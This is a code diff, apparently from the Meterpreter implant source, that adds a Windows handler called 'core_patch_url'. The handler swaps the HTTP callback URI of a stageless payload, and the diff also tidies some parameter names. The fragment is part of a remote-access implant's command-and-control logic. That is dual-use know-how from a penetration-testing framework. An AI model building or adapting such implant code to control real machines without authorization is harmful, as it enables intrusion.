@@ -7,8 +7,11 @@ extern HINSTANCE hAppInstance;
 
 PLIST gExtensionList = NULL;
 
-DWORD request_core_enumextcmd(Remote* pRemote, Packet* pPacket);
-DWORD request_core_machine_id(Remote* pRemote, Packet* pPacket);
+DWORD request_core_enumextcmd(Remote* remote, Packet* packet);
+DWORD request_core_machine_id(Remote* remote, Packet* packet);
+#ifdef _WIN32
+BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result);
+#endif
 
 // Dispatch table
 Command customCommands[] = 
@@ -16,6 +19,9 @@ Command customCommands[] =
 	COMMAND_REQ("core_loadlib", request_core_loadlib),
 	COMMAND_REQ("core_enumextcmd", request_core_enumextcmd),
 	COMMAND_REQ("core_machine_id", request_core_machine_id),
+#ifdef _WIN32
+	COMMAND_INLINE_REP("core_patch_url", request_core_patch_url),
+#endif
 	COMMAND_TERMINATOR
 };
 
@@ -47,17 +53,43 @@ BOOL ext_cmd_callback(LPVOID pState, LPVOID pData)
 	return FALSE;
 }
 
+#ifdef _WIN32
+BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result)
+{
+	// this is a special case because we don't actually send
+	// response to this. This is a brutal switch without any
+	// other forms of comms, and this is because of stageless
+	// payloads
+	if (remote->transport->type == METERPRETER_TRANSPORT_SSL)
+	{
+		// This shouldn't happen.
+		*result = ERROR_INVALID_STATE;
+		return TRUE;
+	}
 
-DWORD request_core_enumextcmd(Remote* pRemote, Packet* pPacket)
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+	SAFE_FREE(ctx->uri);
+
+	// yes, we are reusing the URL in this case
+	ctx->uri = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
+
+	dprintf("[DISPATCH] Recieved hot-patcheched URL for stageless: %S", ctx->uri);
+
+	*result = ERROR_SUCCESS;
+	return TRUE;
+}
+#endif
+
+DWORD request_core_enumextcmd(Remote* remote, Packet* packet)
 {
 	BOOL bResult = FALSE;
-	Packet* pResponse = packet_create_response(pPacket);
+	Packet* pResponse = packet_create_response(packet);
 
 	if (pResponse != NULL)
 	{
 		EnumExtensions enumExt;
 		enumExt.pResponse = pResponse;
-		enumExt.lpExtensionName = packet_get_tlv_value_string(pPacket, TLV_TYPE_STRING);
+		enumExt.lpExtensionName = packet_get_tlv_value_string(packet, TLV_TYPE_STRING);
 
 		dprintf("[LISTEXTCMD] Listing extension commands for %s ...", enumExt.lpExtensionName);
 		// Start by enumerating the names of the extensions
@@ -65,7 +97,7 @@ DWORD request_core_enumextcmd(Remote* pRemote, Packet* pPacket)
 
 		packet_add_tlv_uint(pResponse, TLV_TYPE_RESULT, ERROR_SUCCESS);
 
-		packet_transmit(pRemote, pResponse, NULL);
+		packet_transmit(remote, pResponse, NULL);
 	}
 
 	return ERROR_SUCCESS;
